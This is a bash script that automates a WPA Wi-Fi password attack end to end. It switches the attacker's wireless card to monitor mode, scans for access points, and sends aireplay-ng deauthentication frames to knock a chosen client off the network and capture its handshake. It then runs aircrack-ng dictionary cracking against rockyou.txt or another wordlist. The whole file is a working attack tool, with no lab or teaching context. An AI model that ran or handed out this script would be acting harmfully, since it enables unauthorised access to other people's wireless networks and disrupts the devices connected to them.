#!/bin/bash
#------------------------#
# Created by Arvin Itaas
# Website:
#------------------------#



# Finds name of attackers wireless interface and store in var INTERFACE
obtain_interface() {

	INTERFACE="$(iw dev | awk '$1=="Interface" {print $2}')"

	clear

	echo Now obtaining wireless interface name.
	sleep 1

	if [ -z "$INTERFACE" ];
	then
		echo No wireless interface has been detected.
		exit 0
	fi

	echo Wireless interface detected with name: $INTERFACE
	sleep 1

}

# Changes wireless interface to monitor mode
monitor_mode() {

	echo Now switching wireless interface to monitor mode...
	sleep 1

	ifconfig $INTERFACE down
	iwconfig $INTERFACE mode monitor
	ifconfig $INTERFACE up

	echo Wireless interface now in monitor mode.
	sleep 1

}

# Prompts user to enter BSSID MAC address of target AP
obtain_ap() {

	x-terminal-emulator -e "airodump-ng -w dumpfiles/dump $INTERFACE" &

	echo
        echo "Now displaying possible targets..."
        sleep 2

	read -p "Enter target BSSID: " APMAC
	sleep 1

	# Finds PID of airodump-ng and kills it
        TEMPPID=`ps -ef | grep "\bairodump-ng -w dumpfiles/dump $INTERFACE\b" | awk '{print $2}'`
        kill 15 $TEMPPID

}

# Obtains the specific channel which the given BSSID is on
obtain_channel() {

	echo
	echo "Retrieving $APMAC channel..."
	sleep 1

	# Obtains the channel of the input BSSID from the dump files of the airodump-ng above
	CH=$(awk -F "\"*, \"*" '$1=="'$APMAC'" {print $4}' dumpfiles/dump-01.csv)

        echo $APMAC found on channel: $CH
	sleep 1

}

# Attempts to retrieve WPA handshake which will be saved in crackfiles/psk.cap
wpa_handshake() {

	local HSHAKE
	local CRACKPID DUMPPID

	create_psk_file
	
	echo
	echo "Attempting to capture packets on channel $CH..."

	# Displays airodump-ng and captured packet info for user on channel $CH
	x-terminal-emulator -e "airodump-ng -w crackfiles/${PSKFILE} -c $CH $INTERFACE" &
	sleep 2

	read -p "Enter target client MAC: " CLMAC
	sleep 1

	echo Attempting to get WPA handshake on $APMAC...

	HSHAKE="temp"

	# Checks if WPA handshake was successfully retrieved
	while [ -n "$HSHAKE" ]
	do
		aireplay-ng -0 5 -a $APMAC -c $CLMAC $INTERFACE
	        sleep 3

		# Attempts to obtain WPA handshake by saving to output file
		aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/$PSKFILE*.cap > dumpfiles/$PSKFILE.txt &
		sleep 1

		# Obtains PID of aircrack process above and will kill it
		CRACKPID=`ps -ef | grep "\baircrack\b" | awk '{print $2}'`
		if [ -n "$TEMPPID" ]
		then
			kill 9 $CRACKPID
		fi

		# If HSHAKE is not null, then WPA handshake was not found
		HSHAKE=$(grep "No valid WPA handshakes found" dumpfiles/$PSKFILE.txt)
		if [ -n "$HSHAKE" ]
		then
			echo
			echo "$HSHAKE"
			echo
		fi

	done

	# Once WPA handshake has been found, airodump-ng is no longer needed
	DUMPPID=`ps -ef | grep "\bairodump-ng\b" | awk '{print $2}'`
	kill 15 $DUMPPID

	echo WPA handshake has been found!

}

# Prompts user to enter file name for psk file
create_psk_file() {

	read -p "Enter file name for psk: " PSKFILE

	cd crackfiles
	LASTFILE=`ls | tail -n 1`

	if [ ! -z "$LASTFILE" ]
	then 
		CRACKFILES=(*)

		is_invalid=true
		
		while [[ "$is_invalid" = true ]]
		do
			for FILE in "${CRACKFILES[@]}"	
			do
				
				if [[ "$FILE" = *"$PSKFILE"* ]]
				then
					echo Invalid file name!
					read -p "Enter file name for psk: " PSKFILE
					break
				fi
			done

			if [[ "$FILE" = "$LASTFILE" ]]
			then
				echo Valid file name!
				is_invalid=false
			fi	
		
		done
	fi
		
	echo Creating psk file named: $PSKFILE
	cd ..
}

# Attempts to crack WPA key using WPA handshake through public wordlists
wordlist_crack() {

	# Display wordlists found in wordlists/ to attacker
	cd wordlists
	WORDLISTS=(*)

	COUNT=0

	echo "Wordlists available:"
	echo
	for WORDLIST in "${WORDLISTS[@]}"
	do
		((COUNT++))
		echo $COUNT. $WORDLIST
	done


	# Allows user to choose available wordlists
	echo
	read -p "Enter choice [1-${#WORDLISTS[@]}]: " CHOICE
	((CHOICE--))

	WORDLIST=${WORDLISTS[$CHOICE]}

	echo Now using wordlist: $WORDLIST...
	sleep 1
	cd ..

	x-terminal-emulator -e "aircrack-ng -w wordlists/$WORDLIST -b $APMAC crackfiles/"$PSKFILE"*.cap ; bash" &
	echo 
		
	#Prompts user to exit aircrack by pressing enter
	read -p "Press <enter> to exit aircrack... " 
	read -p "Are you sure [Y/N]? " RESPONSE
	case $RESPONSE in
		[Yy]* ) end_attack ;;
		[Nn]* ) echo Continuing aircrack... ;;
		* ) echo "Entered invalid response..." ;;
	esac

	echo
	
	while [ ! "$RESPONSE" = "Y" ] && [ ! "$RESPONSE" = "y" ]
	do
		read -p "Press <enter> to exit aircrack... " 
		read -p "Are you sure [Y/N]? " RESPONSE
		
		case $RESPONSE in
			[Yy]* ) end_attack ;;
			[Nn]* ) echo Continuing aircrack... ;;
		        * ) echo Entered invalid response... ;;
		esac
	
		echo 
	done
}

end_attack() {
	
	echo Killing any remaining processes...
	sleep 1

	# Kills any leftover aircrack processes
	CRACKPID=`ps -ef | grep "\baircrack\b" | awk '{print $2}'`
	echo aircrack-ng processes found: $CRACKPID
	sleep 1

	if [ -n "$CRACKPID" ]; then
		echo Killing these processes
		kill -15 $CRACKPID
	else
		echo "No such processes were found."
	fi

	echo

	# Kills any leftover airodump processes
	DUMPPID=`ps -ef | grep "\bairodump\b" | awk '{print $2}'`
	echo airodump-ng processes found: $DUMPPID
	sleep 1

	if [ -n "$DUMPPID" ]; then
		echo Killing these processes
		kill -15 $DUMPPID
	else
		echo "No such processes were found."
	fi

	sleep 1
	echo Wordlist attack has ended.

	# Cleans dumpfiles folder
	rm dumpfiles/*
	echo Removing dump files

}

#-------------------------------#
#	MAIN EXECUTION		#
#-------------------------------#

obtain_interface
monitor_mode
obtain_ap
obtain_channel
wpa_handshake
wordlist_crack
